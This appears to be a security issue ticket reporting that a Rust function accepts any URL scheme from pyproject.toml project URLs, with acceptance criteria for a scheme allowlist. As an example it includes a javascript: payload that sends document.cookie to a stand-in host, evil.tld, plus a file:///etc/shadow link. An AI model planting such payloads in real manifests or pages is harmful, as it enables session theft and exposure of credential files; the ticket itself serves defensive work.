---
id: TASK-1755
title: >-
  SEC-11: pick_url has no URL-scheme allowlist — javascript:/data:/file: reach
  the rendered homepage and repository fields
status: Triage
assignee: []
created_date: '2026-08-27 11:17'
labels:
  - code-review-rust
  - security
dependencies: []
modified_files:
  - extensions-python/about/src/lib.rs
priority: high
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
**File**: `extensions-python/about/src/lib.rs:348` (`pick_url`), with the resulting values consumed at `extensions-python/about/src/lib.rs:284-296` (`extract_urls`) and surfaced via `ParsedManifest.homepage` / `.repository` (`lib.rs:99-100`).

**What**: `pick_url` accepts any `[project.urls]` value from `pyproject.toml` after only two checks — `trim_nonempty` and `contains_control_chars`. There is no allowlist of URL schemes. A checked-out repository whose `pyproject.toml` contains:

```toml
[project.urls]
Homepage = "javascript:fetch('https://evil.tld/?c='+document.cookie)"
Repository = "file:///etc/shadow"
```

flows unmodified into `ProjectIdentity.homepage` / `.repository`, which are rendered as About-card field values (`crates/core/src/project_identity/card.rs:105-107`) and emitted verbatim in the `ops about --json` payload.

**Why it matters**: OWASP A03 (Injection). The About card is rendered to a terminal (modern terminals auto-linkify `scheme:` values via OSC 8), to markdown, and to JSON consumed by downstream tooling. `javascript:` and `data:text/html;base64,...` become clickable XSS payloads in any HTML/markdown surface; `file:` becomes a local-file exfiltration link. The manifest is untrusted input — `ops about` is routinely run against third-party checkouts.

The crate already accepted the "manifest URLs are attacker-controlled" premise for control characters (SEC-2 / TASK-1207, `contains_control_chars` at `lib.rs:377`), so the scheme gap is an inconsistent half-measure on the same threat model.

**Cross-crate note**: the sibling `extensions-node/about/src/repo_url.rs::normalize_repo_url` has the identical gap, filed separately as TASK-1722. A shared scheme-allowlist helper in `ops_about::text_util` (next to `trim_nonempty`) would fix both; this task tracks the Python provider's side.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 pick_url rejects any [project.urls] value whose scheme is not on an explicit allowlist (at minimum https, http; git/ssh forms only if normalised to https first)
- [ ] #2 A scheme-less relative value (e.g. "example.com/x") is either rejected or explicitly normalised — it must not fall through unvalidated
- [ ] #3 Rejection drops the field to None (matching the SEC-2 / TASK-1207 drop-not-strip policy) rather than emitting a partial URL
- [ ] #4 Tests cover javascript:, data:, file: and vbscript: for both the homepage and repository slots, asserting the field is None
- [ ] #5 The allowlist policy is stated in a doc comment referencing the SEC-2 sibling policy
<!-- AC:END -->
